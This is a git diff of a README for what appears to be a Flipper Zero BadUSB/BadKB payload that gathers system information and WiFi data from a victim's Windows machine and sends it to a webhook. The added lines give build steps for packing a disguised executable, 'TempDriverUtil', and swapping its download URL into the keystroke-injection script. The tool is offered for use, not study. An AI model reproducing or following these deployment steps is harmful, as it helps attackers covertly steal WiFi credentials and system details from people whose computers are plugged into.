@@ -16,16 +16,16 @@ Default: true,true,true
 
 --------------------------------------------------------
 
+What will be sent:
+
+![alt text](https://github.com/PCMon/FlipperZero-BadUSB-BadKB-SysInfoAndWifi/blob/main/image.png?raw=true)
+
 [Full .exe code also included.](https://github.com/PCMon/FlipperZero-BadUSB-BadKB-SysInfoAndWifi/blob/main/TempDriverUtil.py)
 
 If the program fails in some way to collect any information as seen in the webhook embeds please comment the issue and i'll look into it.
 (Unsure if GPU works for non-nvidia GPU's).
 
 PAYLOAD TIME: 15.812s
-
-What will be sent:
-
-![alt text](https://github.com/PCMon/FlipperZero-BadUSB-BadKB-SysInfoAndWifi/blob/main/image.png?raw=true)
 
 If errors occour in the powershell terminal, it may be due to a slow computer messing up the timing of the DELAY functions in the payload. Remember, you can always enter these powershell lines manually or change the DELAY timings.
 
@@ -34,8 +34,20 @@ You cannot run the .exe standalone as it requires variables present in a .txt (j
 --------------------------------------------------------
 ### Packing the .py file into a .exe if you don't trust it:
 
-Have python3 installed (Duh)
+Have python3 installed (Duh).
 
-Open an administrative command prompt window and enter:
+Install the following:
 
 ```pip install pyinstaller```
+```pip install requests```
+```pip install psutil```
+
+Navigate to the location of the .py file:
+
+```cd <dir>```
+
+Convert the .py to a singular .exe file:
+
+```python -m PyInstaller -f TempDriverUtil.py```
+
+Upload the .exe somewhere and change the url in the 30th line of the [FlipperZero Script](https://github.com/PCMon/FlipperZero-BadUSB-BadKB-SysInfoAndWifi/blob/main/FlipperZero%20Payload.txt) to that upload location.
